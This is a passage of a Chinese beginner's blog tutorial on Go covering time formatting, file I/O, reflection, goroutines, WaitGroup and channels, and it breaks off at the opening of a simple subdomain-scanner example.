string">"2006-01-02  15:04:05"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出结果为：2021-06-04  11:29:45</span></code></pre><p>将字符串转换为时间戳：</p><pre class=" language-go"><code class="language-go">Te<span class="token punctuation">,</span>err <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"2006-01-02"</span> <span class="token punctuation">,</span><span class="token string">"2021-06-04"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span><span class="token boolean">nil</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>Te<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//以2006-01-02的格式输出2021-06-04的时间</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>Te<span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出时间戳</span></code></pre><p>输出东八区的时间</p><pre class=" language-go"><code class="language-go">loc<span class="token punctuation">,</span> err <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">LoadLocation</span><span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    timeobj<span class="token punctuation">,</span> err <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">ParseInLocation</span><span class="token punctuation">(</span><span class="token string">"2006-01-02 15:04:05"</span><span class="token punctuation">,</span> <span class="token string">"2021-06-04 12:06:40"</span><span class="token punctuation">,</span> loc<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>timeobj<span class="token punctuation">)</span></code></pre><h3 id="runtime包"><a href="#runtime包" class="headerlink" title="runtime包"></a>runtime包</h3><p>Caller函数</p><pre class=" language-go"><code class="language-go">pc<span class="token punctuation">,</span>file<span class="token punctuation">,</span>line<span class="token punctuation">,</span>ok<span class="token operator">:=</span>runtime<span class="token punctuation">.</span><span class="token function">Caller</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//pc为uintptr类型的变量</span><span class="token comment" spellcheck="true">//file为文件的绝对路径</span><span class="token comment" spellcheck="true">//line表示在第几行代码处调用了这个函数</span><span class="token comment" spellcheck="true">//ok为报错信息</span></code></pre><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>文件读取需要用到一个名为os的包，其中包含了打开文件的函数和读取文件的函数</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    file<span class="token punctuation">,</span>err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./main.go"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span><span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> tmp <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token builtin">byte</span>    n<span class="token punctuation">,</span>err <span class="token operator">:=</span> file<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>以上例子为打开当前目录下的mian.go文件并读取，其中os.Open函数为打开文件的函数，用法为os.Open(“相对路径”)，此函数会返回两个返回值其中file接收的是一个*file类型的返回值，err接收的是错误的返回值。</p><p>file.Close()函数为关闭读取文件的函数，通常会与defer一起运用</p><h3 id="file-Read-函数"><a href="#file-Read-函数" class="headerlink" title="file.Read()函数"></a>file.Read()函数</h3><p>file.Read()函数为读取文件的函数它实际上是一个方法，具体为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>f <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token function">Read</span><span class="token punctuation">(</span>b <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span>err <span class="token builtin">error</span><span class="token punctuation">)</span></code></pre><p>传入的参数为byte类型，visual code的介绍为：</p><p>Read reads up to len(b) bytes from the File. It returns the number of bytes read and any error encountered. At end of file, Read returns 0, io.EOF.</p><p>意思为：</p><p>Read从文件读取最多len(b)个字节。它返回读取的字节数和遇到的任何错误。文件结束时，Read返回0,io.EOF。</p><p>此时它会将读取的内容存储到tmp这个byte类型的数组中，而这个函数的返回值n表示此次读了多少个字节。</p><h3 id="bufio-NewReader-函数"><a href="#bufio-NewReader-函数" class="headerlink" title="bufio.NewReader()函数"></a>bufio.NewReader()函数</h3><p>此函数与上边的file.Read函数一样输一个读取函数具体用法为：</p><pre class=" language-go"><code class="language-go">reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//接收一个os.Open函数的*file的返回值file</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        fileread<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//读到\n第一次出现为止</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>fileread<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//循环按行读取</span></code></pre><h3 id="iout-ReadFile函数"><a href="#iout-ReadFile函数" class="headerlink" title="iout.ReadFile函数"></a>iout.ReadFile函数</h3><p>此函数遇上一个函数作用相同都是打印读取的内容，不过此函数打印的是完整的文件内容</p><pre class=" language-go"><code class="language-go"> <span class="token keyword">func</span> <span class="token function">read3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     file<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"./main.go"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//返回一个字节类型的数据和一个error类型的数据</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>         fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>     <span class="token punctuation">}</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre><h2 id="文件的写入"><a href="#文件的写入" class="headerlink" title="文件的写入"></a>文件的写入</h2><h3 id="os-OpenFile-函数"><a href="#os-OpenFile-函数" class="headerlink" title="os.OpenFile()函数"></a>os.OpenFile()函数</h3><p>os.OpenFile()函数能够以特定形式打开一个文件，从而达到写入文件的效果</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Openfile</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">,</span>flag <span class="token builtin">int</span><span class="token punctuation">,</span>perm Filemode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>File<span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//函数参数和返回值</span></code></pre><p>name为打开的文件名字，perm filemode表示权限，实际上表示在Linux系统中是以怎样的权限打开文件，flag表示为以怎样的方式打开文件，常见flag的参数为：</p><ul><li>O_RDONLY：只读模式打开文件；</li><li>O_WRONLY：只写模式打开文件；</li><li>O_RDWR：读写模式打开文件；</li><li>O_APPEND：写操作时将数据附加到文件尾部（追加）；</li><li>O_CREATE：如果不存在将创建一个新文件；</li><li>O_EXCL：和 O_CREATE 配合使用，文件必须不存在，否则返回一个错误；</li><li>O_SYNC：当进行一系列写操作时，每次都要等待上次的 I/O 操作完成再进行；</li><li>O_TRUNC：如果可能，在打开时清空文件。</li></ul><p>如果想要同时使用写和读只需要对flag参数进行逻辑异或运算，flag的常见参数为16进制的数我们在进行逻辑异或运算后得到是一个二进制的数，而flag的检查则为在某一个位置上的数字是否为1，为1的话表示执行这个操作。</p><h3 id="write函数和writestring函数"><a href="#write函数和writestring函数" class="headerlink" title="write函数和writestring函数"></a>write函数和writestring函数</h3><p>两个函数均为向文件中写入，</p><p>write函数的用法为：</p><pre class=" language-go"><code class="language-go">file<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//write函数为*os.file的方法，传入的参数类型需要为[]byte类型</span></code></pre><p>writestring函数的用法为：</p><pre class=" language-go"><code class="language-go">file<span class="token punctuation">.</span><span class="token function">writestring</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//writestring函数相对于write函数来说并没有参数的限制</span></code></pre><h3 id="bufioNewWriter函数"><a href="#bufioNewWriter函数" class="headerlink" title="bufioNewWriter函数"></a>bufioNewWriter函数</h3><p>此函数同上边两个函数作用相同也是向文件中写入</p><pre class=" language-go"><code class="language-go">wd <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewWriter</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//接收一个file（上边OpenFile函数返回的*file）</span>wd<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//写入缓存</span>wd<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//从缓存中向文件写入</span></code></pre><h3 id="ioutil-WriteFile函数"><a href="#ioutil-WriteFile函数" class="headerlink" title="ioutil.WriteFile函数"></a>ioutil.WriteFile函数</h3><p>此函数同以上函数的作用相同，向文件中写入，语法为</p><pre class=" language-go"><code class="language-go">str <span class="token operator">:=</span> <span class="token string">"wdnmd"</span><span class="token comment" spellcheck="true">//将需要写入的内容赋值给一个字符串</span>err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"./wdnmd.txt"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//此函数有三个参数，第一个为需要打开的文件名，第二个为写入的类型，第三个为权限</span></code></pre><h2 id="kind和type"><a href="#kind和type" class="headerlink" title="kind和type"></a>kind和type</h2><p>在go语言中类型的划分为两种，一种是kind；一种是type；type指的是当前的表层类型，而kind指的是最底层的种类，举一个例子</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"reflect"</span><span class="token punctuation">)</span><span class="token keyword">type</span> person <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义一个person类型的结构体</span><span class="token keyword">func</span> <span class="token function">typeof</span><span class="token punctuation">(</span>t <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    x <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//判断传入空接口的数据类型</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//输出该数据的type类型</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//输出该数据的kind类型</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> b person    <span class="token function">typeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这个例子的输出为：</p><pre class=" language-shell"><code class="language-shell">main.personstruct</code></pre><p>type输出的是我们自己所定义的一个person类型，虽然我们知道它本质上是结构体类型，但type识别为person类型，而kind会识别你你传入t这个空接口最本质的类型：结构体类型。</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>引用（虽然我也看不太懂）：</p><pre><code>在计算机科学中，反射是指计算机程序在运行时（Run time）可以访问、检测和修改它本身状态或行为的一种能力。用比喻来说，反射就是程序在运行的时候能够“观察”并且修改自己的行为。</code></pre><p>目前我已知能够用到反射的场景为传入函数的参数为一个空接口类型，由于空接口类型能够传入所有类型所有值，所以有时后需要我们对传入的数据进行类型和值得判断。</p><h3 id="kind和type-1"><a href="#kind和type-1" class="headerlink" title="kind和type"></a>kind和type</h3><p>在go语言中类型的划分为两种，一种是kind；一种是type；type指的是当前的表层类型，而kind指的是最底层的种类，举一个例子</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"reflect"</span><span class="token punctuation">)</span><span class="token keyword">type</span> person <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义一个person类型的结构体</span><span class="token keyword">func</span> <span class="token function">typeof</span><span class="token punctuation">(</span>t <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    x <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">TypeOf</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//判断传入空接口的数据类型</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//输出该数据的type类型</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//输出该数据的kind类型</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> b person    <span class="token function">typeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这个例子的输出为：</p><pre class=" language-shell"><code class="language-shell">main.personstruct</code></pre><p>type输出的是我们自己所定义的一个person类型，虽然我们知道它本质上是结构体类型，但type识别为person类型，而kind会识别你你传入t这个空接口最本质的类型：结构体类型。</p><h3 id="对反射的数据进行值的修改"><a href="#对反射的数据进行值的修改" class="headerlink" title="对反射的数据进行值的修改"></a>对反射的数据进行值的修改</h3><p>由于我们向一个函数传入参数，如果对该值进行了修改，只会修改它的副本，不会修改它内存地址上所存储的值，所以我们如果想要对反射的值进行修改就需要传入一个指针，达到修改内存地址所存储的值得目的。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"reflect"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">reflectvalue</span><span class="token punctuation">(</span>x <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    v <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">ValueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//判断传入的数据类型</span>    <span class="token keyword">if</span> v<span class="token punctuation">.</span><span class="token function">Elem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> reflect<span class="token punctuation">.</span>Int64 <span class="token punctuation">{</span>        v<span class="token punctuation">.</span><span class="token function">Elem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">SetInt</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//利用elem方法来获取指针所对应的值</span>    <span class="token comment" spellcheck="true">//利用setint函数修改该指针所存储的数据</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> s <span class="token builtin">int64</span> <span class="token operator">=</span> <span class="token number">100</span>    <span class="token function">reflectvalue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="go语言的并发和并行"><a href="#go语言的并发和并行" class="headerlink" title="go语言的并发和并行"></a>go语言的并发和并行</h2><p>并发的定义：</p><p>同一时间段内同一个源执行多个任务（说通俗点就是在同一时间段内你同时和两个女朋友聊天（我没有女朋友-.-））</p><p>并行的定义：</p><p>同一时刻执行多个任务（你和你朋友都在和女朋友用微信聊天）</p><p>go语言中通过goroutine来实现并发，例子如下：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">go</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>go语言中在要执行的语句前加go表示创建一个进程来执行此语句也就是上述例子中的go hello()，至于为什么要sleep是因为我们是在main这个函数下创建的线程，而main函数只有两句话就结束了随之的main函数启动的goroutine也就结束了，如果我们不加sleep函数则会导致go hello()这个线程刚创建就结束了（还没开始就结束了），所以需要用sleep等待go hello()这个goroutine运行。</p><p>for循环和goroutine的组合</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>在运行上边的例子时我们会发现输出结果有很多的重复，原因是我们在一次for循环时创建了一个gotoutine这时会请求i的值由于我们并没有将i作为参数传入函数所以会向上一级请求i的值然后输出，但是，for循环不会等我这个goroutine运行完再进行下一次循环，所以我们就请求了很多相同的值，优化过后的代码为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"wdnmd"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>此时我们把i作为匿名函数的参数进行goroutine输出，此时由于i已经是创建线程时的参数，与for循环是否顺利进行无关了，不需要再向上一级请求i的值，所以就打印完全了，至于为什么打印出的值无序是因为有些进程先完成打印，有些晚完成。</p><h3 id="sync-WaitGroup的使用"><a href="#sync-WaitGroup的使用" class="headerlink" title="sync.WaitGroup的使用"></a>sync.WaitGroup的使用</h3><p>代码：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"sync"</span><span class="token punctuation">)</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token comment" spellcheck="true">//定义一个名为wg的变量类型为WaitGroup</span><span class="token keyword">func</span> <span class="token function">f1</span><span class="token punctuation">(</span>a <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//进程结束wg减一</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//每开一个进程就将wg加一</span>        <span class="token keyword">go</span> <span class="token function">f1</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//等待wg减为0，如果没有上方的wg.Done语句则会出现报错</span><span class="token punctuation">}</span></code></pre><p>在上边我们用time.Sleep来等待进程结束但这样有时候无法确认需要sleep的时间所以利用sync.WaitGroup来判断一个线程的是否关闭</p><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><pre class=" language-text"><code class="language-text">“不要通过共享内存来通信，而应该通过通信来共享内存”</code></pre><p>这是引自golang社区的经典语句，</p><p>在上边简单说明了多线程，而如果我们利用goroutine实现了一个函数，同时也利用goroutine实现了另一个函数，如果这两个goroutine之间需要进行数据交互，就需要用到channel这一类型，而channel表示的是创建一个通道，不同于其他语言的通过改变一个全局变量的值来实现不同线程之间的共享内存来通信，go语言采用的是将两个线程之间连接通道的通过通信来共享内存。</p><p>channel采用的是队列的方式进行数据的传输，也就是先进先出</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> a <span class="token keyword">chan</span> <span class="token builtin">int</span>   <span class="token comment" spellcheck="true">//定义一个int类型的channel</span>a <span class="token operator">=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//对channel进行初始化且没有分配缓冲区</span>a <span class="token operator">=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//对channel进行初始化并分配了大小为10的缓冲区</span></code></pre><p>通道类型定义之后就只能传该类型的数据，且在定义channel之后一定要进行初始化。</p><pre class=" language-go"><code class="language-go">ch <span class="token operator">&lt;-</span> <span class="token number">10</span>  <span class="token comment" spellcheck="true">//向通道中发送10</span>x<span class="token operator">:=</span> <span class="token operator">&lt;-</span>ch  <span class="token comment" spellcheck="true">//从通道中接收值并赋值给x</span><span class="token operator">&lt;-</span>ch      <span class="token comment" spellcheck="true">//从通道中接收值但忽略</span><span class="token function">close</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//关闭通道</span></code></pre><h3 id="一个简单的子域名扫描器："><a href="#一个简单的子域名扫描器：" class="headerlink" title="一个简单的子域名扫描器："></a>一个简单的子域名扫描器：</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"bufio"</span>    <span class="token string">"fmt"</span>    <span class="token string">"io"</span>    <span class="token string">"net/http"</span>    <span class="token string">"os"</span>    <span class="token string">"strings"</span>    <span class="token string">"sync"</span><span class="token punctuation">)</span><span class="token keyword">var</span> ch <span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token keyword">var</span> final <span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token keyword">func</span> <span class="token function">request</span><span class="token punctuation">(</span>ch <span class="token operator">&lt;-</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">,</span> final <span class="token keyword">chan</span><span 